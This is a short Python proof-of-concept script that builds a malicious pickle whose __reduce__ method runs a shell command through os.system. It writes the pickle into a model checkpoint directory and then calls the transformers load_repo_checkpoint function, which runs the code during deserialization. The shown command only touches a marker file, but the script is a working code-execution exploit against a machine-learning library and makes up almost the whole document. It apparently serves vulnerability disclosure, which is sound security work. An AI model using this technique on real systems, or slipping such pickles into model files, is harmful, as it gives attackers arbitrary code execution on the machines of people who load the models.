from transformers import TFAutoModel
from tensorflow.keras.optimizers import Adam

import pickle
class Retr0REG:
    def __reduce__(self):
        import os
        cmd = 'touch ~/hacked-by-retr0reg'
        return (os.system,(cmd,))

poc = Retr0REG()
with open('./EvanModel/checkpoint/extra_data.pickle','wb') as fp:
    pickle.dump(poc,fp)

# Initialize and compile the model
model = TFAutoModel.from_pretrained('bert-base-uncased')
model.compile(optimizer=Adam(learning_rate=5e-5), loss='sparse_categorical_crossentropy', metrics=['accuracy'])
model.load_repo_checkpoint('./EvanModel')
